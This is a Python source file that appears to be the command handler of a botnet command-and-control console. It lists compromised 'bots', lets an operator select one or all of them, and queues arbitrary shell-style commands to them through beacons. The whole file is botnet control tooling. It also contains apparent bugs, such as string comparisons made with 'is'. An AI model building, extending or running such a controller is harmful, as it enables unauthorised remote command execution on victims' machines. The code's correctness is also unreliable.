import threading
import time
import logger
import urwid
import json

from config import ServerConfig
from utils import wrap_response

logger = logger.get_logger(__name__)

class CommandHandler(object):

    def __init__(self, mqs, slave2beacon, rq):
        self.message_queues = mqs
        self.slave2beacon = slave2beacon
        self.response_queue = rq

    def number_of_bots(self):
        return sum([1 for slave in self.slave2beacon.keys()])

    def number_of_beacons(self):
        return sum([1 for addr in self.message_queues.keys() if addr is not "all"])

    def active_bots(self):
        if self.number_of_bots() > 0:
            response = "[+] Active Bots:\n"
            response += "\n".join(["{0}) {1}"
                        .format(idx+1, ServerConfig.UI_BOT_IDENTIFIER(slave)) for idx, slave in enumerate(self.slave2beacon.keys())])
        else:
            response = "[+] There are not any active bots"
        return response

    def handle_command(self, cmd, interface_footer):
        logger.debug("Command and Control: Typed command: {0}".format(cmd))
        cmd = cmd.strip()
        prompt = interface_footer.caption.strip()
        if prompt is ">":
            if cmd == "bots" or cmd == "b":
                self.response_queue.put(wrap_response("SYSTEM", self.active_bots()))
            elif cmd == "interact" or cmd == "i":
                interface_footer.set_caption("Select Slave >")
            elif cmd == "mass" or cmd == "m":
                interface_footer.set_caption("All >")
            elif cmd == "":
                pass
            else:
                self.response_queue.put(wrap_response("SYSTEM", "Unknown command: {}".format(cmd)))
        elif prompt is "Select Slave >":
            if cmd == "back" or cmd is "b":
                interface_footer.set_caption(" >")
            else:
                try:
                    slave_num = int(cmd)
                    self.recipient = list(self.slave2beacon.keys())[slave_num-1]
                    bot_prompt = ServerConfig.UI_BOT_IDENTIFIER(self.recipient)
                    interface_footer.set_caption("{0} >".format(bot_prompt))
                except (ValueError, IndexError):
                    response = "Please select a number from the bot list:\n" + self.active_bots()
                    self.response_queue.put(wrap_response("SYSTEM", response))
        elif prompt is "All >":
            if cmd == "back" or cmd is "b":
                interface_footer.set_caption(" >")
            else:
                logger.debug('Queuing command "{0}" for all bots'.format(cmd))
                wrapped_command = json.dumps({"to": "all", "cmd": cmd})
                for i in range(self.number_of_beacons()):
                    self.message_queues["all"].put(wrapped_command)
        else:   # This means prompt point to individual bot
            if cmd == "back" or cmd is "b":
                interface_footer.set_caption("Select Slave >")
            else:
                logger.debug('Queuing command "{0}" for {1}'.format(cmd, self.slave2beacon[self.recipient]))
                wrapped_command = json.dumps({"to": self.recipient.mac_addr, "cmd": cmd})
                self.message_queues[self.slave2beacon[self.recipient]].put(wrapped_command)
            